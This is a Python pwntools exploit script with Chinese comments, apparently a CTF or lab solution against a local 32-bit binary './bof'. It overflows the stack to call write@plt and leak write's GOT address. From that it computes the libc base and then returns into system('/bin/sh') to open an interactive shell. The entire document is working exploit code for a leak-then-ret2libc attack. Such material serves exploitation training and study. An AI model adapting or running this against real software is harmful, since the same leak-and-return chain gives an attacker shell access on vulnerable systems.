from pwn import *

s = process("./bof")
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

context.arch = 'i386'
context.log_level='debug'

write_plt = 0x080483c0 # PLT表中WRITE表项的地址
write_got = 0x0804a01c # GOT表中WRITE表项的地址
vuln = 0x080484d6

# 1. 利用WRITE系统调用泄露WRITE的真实内存地址
payload = b'a' * 112 
payload += p32(write_plt)
payload += p32(vuln) # 将返回地址设置成vuln函数的地址，便于第二次栈溢出取得shell
payload += p32(1) # WRITE系统调用的第一个参数，表示输出到终端
payload += p32(write_got) # WRITE系统调用的第二个参数，表示GOT表中WRITE表项的地址
payload += p32(4) # WRITE系统调用的第三个参数，表示输出字节数
s.recv(23)
s.sendline(payload)

write_addr = u32(s.recv(10)) # 此实writr_addr已经获得了WRITE的真实内存地址

# 2. 利用WRITE的真实地址和WRITE相对libc的偏移地址获得libc的基地址，进而获得其他系统调用的真实内存地址等
libc_base = write_addr - libc.sym['write']
system = libc_base + libc.sym['system'] # system为SYSTEM的真实内存地址
binsh = libc_base + next(libc.search('/bin/sh')) # binsh为libc中第一个‘/bin/sh’字符串的真实内存地址

# 3. 再次利用栈溢出漏洞获取shell
payload = b'a' * 112 
payload += p32(system)
payload += p32(vuln) # 将返回地址设置成vuln函数的地址
payload += p32(binsh) #SYSTEM系统调用的第一个参数，表示需要执行的命令或程序

gdb.attach(s)
s.sendline(payload)

s.interactive()
